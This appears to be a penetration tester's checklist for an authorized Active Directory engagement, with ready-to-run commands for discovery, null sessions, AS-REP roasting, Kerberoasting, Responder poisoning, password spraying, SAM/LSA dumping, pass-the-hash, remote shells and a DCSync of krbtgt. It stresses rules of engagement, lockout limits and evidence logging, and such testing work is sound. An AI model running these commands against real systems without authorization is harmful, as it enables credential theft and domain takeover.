# Active Directory / Internal Network Run Sheet

> Before each step, check the ROE. Spraying, poisoning, and relay can be restricted or disruptive.
> Variables: `$DC` = domain controller IP, `$D` = domain, `$U`/`$P` = current credential.

## 1. Discovery (no creds)
- [ ] Host discovery on in-scope ranges only: `nmap -sn -iL scope.txt -oA disc`
- [ ] Service scan: `nmap -sC -sV -iL live.txt -oA svc` (go slower on fragile or OT ranges, see the OT sheet)
- [ ] Find the DCs (ports 88, 389, 445, 636): `nxc smb <range>` shows domain, hostname, and SMB signing
- [ ] Relay target list: `nxc smb <range> --gen-relay-list relay.txt` (hosts without SMB signing = **finding**)
- [ ] Null/guest sessions: `nxc smb $DC -u '' -p '' --shares` and `nxc smb $DC -u 'guest' -p '' --shares`
- [ ] Anonymous LDAP: `nxc ldap $DC -u '' -p '' --users`

## 2. First credential
- [ ] **Password policy first:** `nxc smb $DC -u $U -p $P --pass-pol` (note the lockout threshold and window)
- [ ] AS-REP roast (works without a password if you have usernames): `GetNPUsers.py $D/ -usersfile users.txt -dc-ip $DC -format hashcat -outputfile asrep.txt`
- [ ] Poisoning, **only if the ROE allows**: `responder -I <iface> -A` (analyze mode) first, then full mode only if permitted
- [ ] Spraying: **at most (threshold − 2) attempts per observation window**, logged with timestamps

## 3. Authenticated enumeration
- [ ] Users, groups, and descriptions (passwords in descriptions are a classic): `nxc ldap $DC -u $U -p $P --users`
- [ ] Shares: `nxc smb <range> -u $U -p $P --shares` → look in readable shares for scripts, configs, and backups
- [ ] BloodHound: `bloodhound-python -d $D -u $U -p $P -ns $DC -c All --zip`, then mark owned principals and run shortest paths
- [ ] Kerberoast: `GetUserSPNs.py $D/$U:$P -dc-ip $DC -request -outputfile kerb.txt`
- [ ] ADCS: `certipy find -u $U@$D -p $P -dc-ip $DC -vulnerable -stdout`
- [ ] Where can this credential log in? `nxc smb <range> -u $U -p $P`, `nxc winrm <range> -u $U -p $P` (`Pwn3d!` = local admin)

## 4. Escalation and movement
- [ ] Crack hashes offline: `hashcat -m 13100 kerb.txt` (TGS), `-m 18200` (AS-REP), `-m 5600` (NetNTLMv2)
- [ ] Reuse every new credential across all hosts (credential reuse = **finding**)
- [ ] Local admin hashes: `nxc smb <host> -u <admin> -p <P> --sam` / `--lsa`
- [ ] Pass-the-hash: `nxc smb <range> -u <user> -H <NThash>`
- [ ] Shells: `evil-winrm -i <host> -u <user> -p <P>` / `wmiexec.py` (psexec is the noisiest and creates a service)
- [ ] ACL abuse paths from BloodHound (GenericAll, WriteDACL, ForceChangePassword). **Record every change you make so you can report and revert it.**

## 5. Domain compromise (prove it, don't wreck it)
- [ ] DCSync with an account that has the rights: `secretsdump.py $D/<user>:<P>@$DC -just-dc-user krbtgt`
- [ ] Screenshot proof, then **stop**. Record exactly what you touched for cleanup.

## Evidence for every step
Timestamped command + output + screenshot → `evidence/F-XXX-NN.png`
